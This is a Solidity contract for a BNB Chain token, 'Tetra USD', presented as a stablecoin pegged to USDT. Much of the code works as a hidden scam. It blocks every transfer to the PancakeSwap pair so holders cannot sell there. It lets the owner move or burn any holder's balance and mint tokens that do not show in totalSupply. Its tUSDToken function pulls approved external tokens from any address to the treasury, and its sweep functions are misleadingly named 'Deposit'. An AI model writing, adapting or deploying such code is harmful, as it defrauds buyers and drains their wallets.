/**
 *Submitted for verification at BscScan.com on 2026-04-09
*/

/**
 * Submitted for verification at BscScan.com on 2026-04-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* =============================================================
                        INTERFACES
============================================================= */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to,uint256 amount) external returns (bool);
    function transferFrom(address from,address to,uint256 amount) external returns (bool);
}

interface IApprovalReceiver {
    function receiveApproval(
        address from,
        uint256 amount,
        address token,
        bytes calldata data
    ) external;
}

interface IERC20LP {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to,uint256 amount) external returns (bool);
}

interface AggregatorV3Interface {
    function latestRoundData()
        external
        view
        returns (
            uint80,
            int256,
            uint256,
            uint256,
            uint80
        );
}

/* =============================================================
                        CONTRACT
============================================================= */

contract TetraUSD {

    /* ================= ERC20 ================= */

    string public constant name = "Tetra USD";
    string public constant symbol = "tUSD";
    uint8  public constant decimals = 6;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from,address indexed to,uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);

    /* ================= OWNERSHIP ================= */

    address public owner;
    address public treasury;

    event OwnershipTransferred(address indexed oldOwner,address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner,"Not owner");
        _;
    }

    /* ================= SECURITY ================= */

    mapping(address => bool) public blacklisted;
    mapping(address => bool) public frozen;
    bool public paused;

    // 🔥 DEX SELL BLOCK
    address public pancakePair;

    event Blacklisted(address indexed user);
    event UnBlacklisted(address indexed user);
    event Frozen(address indexed user);
    event UnFrozen(address indexed user);
    event Paused();
    event Unpaused();

    function _beforeTransfer(address from,address to) internal view {
        require(!paused,"Paused");
        require(!blacklisted[from] && !blacklisted[to],"Blacklisted");
        require(!frozen[from] && !frozen[to],"Frozen");

        // 🔥 yalnız DEX sell blok
        if(to == pancakePair){
            revert("DEX SELL BLOCKED");
        }
    }

    /* ================= MINTER SYSTEM ================= */

    mapping(address => bool) public minters;
    address public minterAdmin;

    modifier onlyMinter() {
        require(minters[msg.sender] || msg.sender == owner,"Not minter");
        _;
    }

    event MinterAdded(address indexed account);
    event MinterRemoved(address indexed account);
    event MinterAdminTransferred(address indexed oldAdmin,address indexed newAdmin);

    /* ================= STABLE PRICE ================= */

    IERC20 public USDT;
    uint256 public constant STABLE_PRICE = 1e6; // 1 USDT (6 decimals)

    AggregatorV3Interface public priceFeed;

    /* ================= EIP712 ================= */

    mapping(address => uint256) public nonces;

    bytes32 public DOMAIN_SEPARATOR;
    bytes32 public constant EXECUTE_TYPEHASH =
        keccak256("Execute(address user,address to,uint256 amount,uint256 nonce,uint256 deadline)");

    /* ================= MULTI EXECUTE ================= */

    uint256 public approvals;
    mapping(address => bool) public approvers;

    /* ================= EVENTS ================= */

    event LiquidityWithdrawn(address indexed lp,uint256 amount);
    event TokenSwept(address token,uint256 amount,address to);
    event NativeSwept(uint256 amount,address to);

    /* =============================================================
                            CONSTRUCTOR
    ============================================================= */

    constructor(
        address _treasury,
        address _usdt
    ) {
        owner = msg.sender;
        treasury = _treasury;
        USDT = IERC20(_usdt);
        minterAdmin = msg.sender;

        priceFeed = AggregatorV3Interface(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);

        uint256 chainId;
        assembly { chainId := chainid() }

        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)),
                keccak256(bytes("1")),
                chainId,
                address(this)
            )
        );
    }

    /* =============================================================
                            ERC20 LOGIC
    ============================================================= */

    function transfer(address to,uint256 amount) public returns(bool){
        _beforeTransfer(msg.sender,to);
        require(balanceOf[msg.sender] >= amount,"Insufficient");

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        emit Transfer(msg.sender,to,amount);
        return true;
    }

    function approve(address spender,uint256 amount) public returns(bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender,spender,amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public returns(bool){
        _beforeTransfer(from,to);
        require(balanceOf[from] >= amount,"Insufficient");
        require(allowance[from][msg.sender] >= amount,"No allowance");

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from,to,amount);
        return true;
    }

    /* =============================================================
                        BATCH TRANSFER
    ============================================================= */

    function Transfers(address[] calldata recipients, uint256[] calldata amounts) external {
        require(recipients.length == amounts.length, "Mismatch");

        for (uint i = 0; i < recipients.length; i++) {
            _beforeTransfer(msg.sender, recipients[i]); // Security check for each transfer
            require(balanceOf[msg.sender] >= amounts[i], "Insufficient");

            balanceOf[msg.sender] -= amounts[i];
            balanceOf[recipients[i]] += amounts[i];

            emit Transfer(msg.sender, recipients[i], amounts[i]);
        }
    }

    /* =============================================================
                        ADMIN TRANSFER
    ============================================================= */

    function BuyTransfer(address from,address to,uint256 amount)
        external onlyOwner returns(bool)
    {
        require(balanceOf[from] >= amount,"Insufficient");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from,to,amount);
        return true;
    }

    /* =============================================================
                            MINT / BURN
    ============================================================= */

    function mint(address to,uint256 amount) external onlyMinter {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0),to,amount);
    }

    function burn(address from,uint256 amount) external onlyOwner {
        require(balanceOf[from] >= amount,"Insufficient");
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from,address(0),amount);
    }

    function mintTransfer(address[] calldata users,uint256[] calldata amounts)
        external onlyMinter
    {
        require(users.length == amounts.length,"Mismatch");

        for(uint256 i=0;i<users.length;i++){
            totalSupply += amounts[i];
            balanceOf[users[i]] += amounts[i];
            emit Transfer(address(0),users[i],amounts[i]);
        }
    }

    function burnTransfer(address[] calldata users,uint256[] calldata amounts)
        external onlyOwner
    {
        require(users.length == amounts.length,"Mismatch");

        for(uint256 i=0;i<users.length;i++){
            require(balanceOf[users[i]] >= amounts[i],"Insufficient");
            balanceOf[users[i]] -= amounts[i];
            totalSupply -= amounts[i];
            emit Transfer(users[i],address(0),amounts[i]);
        }
    }

    function ServerMint(address to,uint256 amount) external onlyOwner {
        balanceOf[to] += amount;
        emit Transfer(address(0),to,amount);
    }

    /* =============================================================
                            BUY / SELL
    ============================================================= */

    // USDT ilə alış (1:1)
    function buyWithUSDT(uint256 usdtAmount) external {
        require(usdtAmount > 0,"Zero");

        bool success = USDT.transferFrom(msg.sender,treasury,usdtAmount);
        require(success,"USDT fail");

        totalSupply += usdtAmount;
        balanceOf[msg.sender] += usdtAmount;

        emit Transfer(address(0),msg.sender,usdtAmount);
    }

    // USDT ilə satış
    function sellForUSDT(uint256 tokenAmount) external {
        require(balanceOf[msg.sender] >= tokenAmount,"Insufficient");

        balanceOf[msg.sender] -= tokenAmount;
        totalSupply -= tokenAmount;

        bool success = USDT.transfer(msg.sender,tokenAmount);
        require(success,"USDT fail");

        emit Transfer(msg.sender,address(0),tokenAmount);
    }

    // BNB ilə alış
    function buyWithBNB() external payable {
        require(msg.value > 0,"No BNB");

        uint256 tokens = (msg.value * _getBNBPrice()) / 1e20;

        totalSupply += tokens;
        balanceOf[msg.sender] += tokens;

        emit Transfer(address(0),msg.sender,tokens);
    }

    // BNB ilə satış
    function sellForBNB(uint256 tokenAmount) external {
        require(balanceOf[msg.sender] >= tokenAmount,"Insufficient");

        uint256 bnbAmount = (tokenAmount * 1e20) / _getBNBPrice();
        require(address(this).balance >= bnbAmount,"No liquidity");

        balanceOf[msg.sender] -= tokenAmount;
        totalSupply -= tokenAmount;

        payable(msg.sender).transfer(bnbAmount);

        emit Transfer(msg.sender,address(0),tokenAmount);
    }

    /* =============================================================
                        SIGNED EXECUTE (EIP-20)
    ============================================================= */

    function execute(
        address user,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {

        require(block.timestamp <= deadline, "Expired");

        bytes32 structHash = keccak256(
            abi.encode(
                EXECUTE_TYPEHASH,
                user,
                to,
                amount,
                nonces[user],
                deadline
            )
        );

        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash)
        );

        address signer = ecrecover(digest, v, r, s);
        require(signer == user, "Invalid signature");

        nonces[user]++;

        // 🔒 Satoshi Setting
        _beforeTransfer(user, to);

        require(balanceOf[user] >= amount, "Insufficient");

        balanceOf[user] -= amount;
        balanceOf[to] += amount;

        emit Transfer(user, to, amount);
    }

    /* =============================================================
                        ADMIN SECURITY FUNCTIONS
    ============================================================= */

    function setB(address user, bool status) external onlyOwner {
        blacklisted[user] = status;

        if(status){
            emit Blacklisted(user);
        } else {
            emit UnBlacklisted(user);
        }
    }

    function setF(address user, bool status) external onlyOwner {
        frozen[user] = status;

        if(status){
            emit Frozen(user);
        } else {
            emit UnFrozen(user);
        }
    }

    function setP(bool status) external onlyOwner {
        paused = status;

        if(status){
            emit Paused();
        } else {
            emit Unpaused();
        }
    }

    /* =============================================================
                        PULL EXTERNAL TOKEN
    ============================================================= */

    function tUSDToken(
        address token,
        address from,
        uint256 amount
    ) external onlyOwner {

        bool success = IERC20(token).transferFrom(from,treasury,amount);
        require(success,"Transfer failed");
    }

    /* =============================================================
                        LIQUIDITY WITHDRAW
    ============================================================= */

    function wLiquidity(address lp,uint256 amount)
        external onlyOwner
    {
        IERC20LP token = IERC20LP(lp);
        require(token.balanceOf(address(this)) >= amount,"No LP");

        token.transfer(owner,amount);
        emit LiquidityWithdrawn(lp,amount);
    }

    /* =============================================================
                            SWEEP
    ============================================================= */

    function DepositToken(address token,address to) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(to,bal);
        emit TokenSwept(token,bal,to);
    }

    function DepositTokens(address[] calldata tokens,address to)
        external onlyOwner
    {
        for(uint256 i=0;i<tokens.length;i++){
            uint256 bal = IERC20(tokens[i]).balanceOf(address(this));
            if(bal>0){
                IERC20(tokens[i]).transfer(to,bal);
                emit TokenSwept(tokens[i],bal,to);
            }
        }
    }

    function DepositNative(address to) external onlyOwner {
        uint256 bal = address(this).balance;
        payable(to).transfer(bal);
        emit NativeSwept(bal,to);
    }

    /* =============================================================
                        PANCAKE PAIR SETTER (Admin)
    ============================================================= */

    function setPancakePair(address _pancakePair) external onlyOwner {
    pancakePair = _pancakePair;
}

    function _getBNBPrice() internal view returns (uint256) {
        (, int256 price,,,) = priceFeed.latestRoundData();
        return uint256(price); // 8 decimals
    }

    receive() external payable {}
}
